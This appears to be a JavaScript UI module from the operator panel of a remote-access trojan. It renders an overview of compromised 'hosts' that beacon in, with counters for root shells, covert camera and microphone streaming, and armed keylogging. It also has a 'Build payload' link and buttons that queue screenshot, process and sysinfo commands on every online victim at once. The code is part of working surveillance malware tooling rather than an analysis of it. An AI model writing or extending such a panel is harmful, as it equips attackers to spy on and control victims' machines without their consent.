/* Overview: fleet health at a glance. */

import * as store from '../store.js';
import { href } from '../router.js';
import { ico, toast } from '../ui.js';
import { api } from '../api.js';
import { ago, esc, presence, STATE_LABEL, bytes, initials, clip } from '../format.js';

const FEED_ICON = { join: 'i-bolt', drop: 'i-warn', error: 'i-warn', result: 'i-term',
  blob: 'i-file', queue: 'i-up', build: 'i-box', boot: 'i-info' };
const ms = (ev) => (ev.ts < 1e13 ? ev.ts * 1000 : ev.ts);

export const overview = {
  mount(root, route) { this.paint(root, route); },
  update(root, route) { this.paint(root, route); },

  paint(root) {
    const c = store.counts();
    const builds = store.state.builds || [];
    const newest = builds.slice(0, 3);
    const lows = store.all()
      .filter((s) => (s.queued > 1 && s.presence !== 'online') || (s.presence === 'offline' && s.queued))
      .slice(0, 4);
    const online = store.all().filter((s) => s.presence === 'online').slice(0, 6);

    root.innerHTML = `
      <div class="page">
        <div class="page-head">
          <div class="ttl">
            <h1>Operations overview</h1>
            <p>Presence, queue pressure and telemetry for the whole fleet. Availability is derived
              from beacon timing — a host is only online while its next beacon window is open.</p>
          </div>
          <div class="spacer"></div>
          <a class="btn ghost" href="${href.environment()}">${ico('i-env')} Environment</a>
          <a class="btn primary" href="${href.payloads()}">${ico('i-box')} Build payload</a>
        </div>

        <div class="kpi-grid">
          <div class="kpi mint"><div class="lbl">${ico('i-bolt')} Online now</div>
            <div class="val">${c.online}</div><div class="sub">of ${c.total} known host${c.total === 1 ? '' : 's'}</div></div>
          <div class="kpi amber"><div class="lbl">${ico('i-clock')} Idle / stale</div>
            <div class="val">${c.idle + c.stale}</div><div class="sub">missed a beacon window</div></div>
          <div class="kpi"><div class="lbl">${ico('i-shield')} Elevated</div>
            <div class="val">${c.elevated}</div><div class="sub">admin / root shell</div></div>
          <div class="kpi violet"><div class="lbl">${ico('i-cam')} Streaming</div>
            <div class="val">${c.streaming}</div><div class="sub">camera or microphone</div></div>
          <div class="kpi blue"><div class="lbl">${ico('i-key')} Keylogging</div>
            <div class="val">${c.keylogging}</div><div class="sub">capture armed</div></div>
          <div class="kpi"><div class="lbl">${ico('i-up')} Queued</div>
            <div class="val">${c.queued}</div><div class="sub">waiting for a beacon</div></div>
          <div class="kpi"><div class="lbl">${ico('i-box')} Artifacts</div>
            <div class="val">${builds.length}</div><div class="sub">${newest[0] ? bytes(newest[0].size) + ' newest' : 'nothing built yet'}</div></div>
        </div>
`;
    this.grid(root, online, lows);
  },

  grid(root, online, lows) {
    root.querySelector('.page').insertAdjacentHTML('beforeend', `
        <div class="ov-grid">
          <div class="card">
            <div class="card-head">${ico('i-pulse')}<h3>Event volume · last 15 minutes</h3>
              <span class="spacer"></span><span class="badge mint">${online.length} live</span></div>
            <div class="card-body">
              <div class="spark" id="ovspark"></div>
              <div class="spark-x"><span>15m</span><span>10m</span><span>5m</span><span>now</span></div>
            </div>
          </div>
          <div class="card">
            <div class="card-head">${ico('i-warn')}<h3>Needs attention</h3></div>
            <div class="card-body">
              ${lows.length ? `<div class="dist">${lows.map((s) => `
                <a class="ln" href="${href.host(s.id)}"><span>${esc(s.host?.hostname || 'unknown')}
                  <span class="dim tiny">${STATE_LABEL[presence(s)]}</span></span>
                  <span class="badge blue">${s.queued} queued</span></a>`).join('')}</div>`
                : '<p class="muted tiny">Nothing stuck — no commands waiting on a host that is behind.</p>'}
            </div>
          </div>
          <div class="card">
            <div class="card-head">${ico('i-fleet')}<h3>Live hosts</h3><span class="spacer"></span>
              <a class="btn ghost sm" href="${href.fleet()}">All hosts</a></div>
            <div class="card-body" style="padding:0">
              ${online.length ? `<table class="tbl">${online.map((s) => `
                <tr class="click" data-go="${href.host(s.id)}">
                  <td style="width:38px"><span class="avatar ${presence(s)}">${esc(initials(s))}</span></td>
                  <td><b>${esc(s.host?.hostname || 'unknown')}</b>
                    <div class="dim tiny mono">${esc(s.host?.user || '?')}${s.host?.elevated ? ' · elevated' : ''}</div></td>
                  <td class="dim tiny mono">${esc(s.remote || '')}</td>
                  <td class="tiny dim">${ago(s.last_seen, store.state.now)} ago</td>
                </tr>`).join('')}</table>`
                : '<div class="empty"><span>No host is online right now.</span></div>'}
            </div>
          </div>
          <div class="card">
            <div class="card-head">${ico('i-pulse')}<h3>Recent activity</h3><span class="spacer"></span>
              <a class="btn ghost sm" href="${href.activity()}">All events</a></div>
            <div class="card-body" style="padding:0">${this.feed()}</div>
          </div>
          <div class="card">
            <div class="card-head">${ico('i-desktop')}<h3>Platform mix</h3></div>
            <div class="card-body">${this.mix()}</div>
          </div>
          <div class="card">
            <div class="card-head">${ico('i-term')}<h3>Operator shortcuts</h3></div>
            <div class="card-body" style="display:grid;gap:7px">
              <p class="muted tiny">Fan a command out to every online host.</p>
              <div class="row wrap">
                <button class="btn sm" data-bulk="sysinfo">${ico('i-info')} Sysinfo</button>
                <button class="btn sm" data-bulk="ps">${ico('i-cpu')} Processes</button>
                <button class="btn sm" data-bulk="screenshot">${ico('i-cam')} Screenshot</button>
              </div>
            </div>
          </div>
        </div>
      </div>`);
    this.wire(root);
  },

  wire(root) {
    const spark = root.querySelector('#ovspark');
    if (spark) spark.innerHTML = this.buckets().map((v, i) => {
      const h = Math.max(2, Math.round((v / Math.max(1, this.peak)) * 84));
      return `<i class="${i >= 27 ? 'hot' : ''}" style="height:${h}px" title="${v} events"></i>`;
    }).join('');
    root.querySelectorAll('[data-go]').forEach((tr) => {
      tr.onclick = () => { location.hash = tr.dataset.go; };
    });
    root.querySelectorAll('[data-bulk]').forEach((b) => {
      b.onclick = async () => {
        const ids = store.all().filter((s) => s.presence === 'online').map((s) => s.id);
        if (!ids.length) { toast('no online host', 'warn'); return; }
        await api.broadcast(ids, b.dataset.bulk, {});
        toast(`queued ${b.dataset.bulk} on ${ids.length} host(s)`);
      };
    });
  },

  buckets() {
    const now = Date.now();
    const out = new Array(30).fill(0);
    for (const ev of store.state.events) {
      const ageMs = now - ms(ev);
      if (ageMs < 0 || ageMs > 900000) continue;
      out[29 - Math.min(29, Math.floor(ageMs / 30000))] += 1;
    }
    this.peak = Math.max(...out, 1);
    return out;
  },

  feed() {
    const items = store.state.events.slice(0, 7);
    if (!items.length) return '<div class="empty"><span>No events yet.</span></div>';
    return `<ul class="feed">${items.map((a) => `<li class="k-${a.kind}">${ico(FEED_ICON[a.kind] || 'i-info')}
      <span>${esc(clip(a.text, 74))}</span><time>${ago(ms(a) / 1000, store.state.now)}</time></li>`).join('')}</ul>`;
  },

  mix() {
    const list = store.all();
    if (!list.length) return '<p class="muted tiny">No hosts yet.</p>';
    const groups = new Map();
    for (const s of list) {
      const key = (s.host?.os || 'unknown').split(/[\s/-]/)[0].toLowerCase();
      groups.set(key, (groups.get(key) || 0) + 1);
    }
    return `<div class="dist">${[...groups.entries()].sort((a, b) => b[1] - a[1]).slice(0, 6).map(([k, n]) => `
      <div class="ln-wrap"><div class="ln"><span>${esc(k)}</span><span class="dim">${n}</span></div>
      <div class="bar"><i style="width:${Math.round((n / list.length) * 100)}%"></i></div></div>`).join('')}</div>`;
  },
};
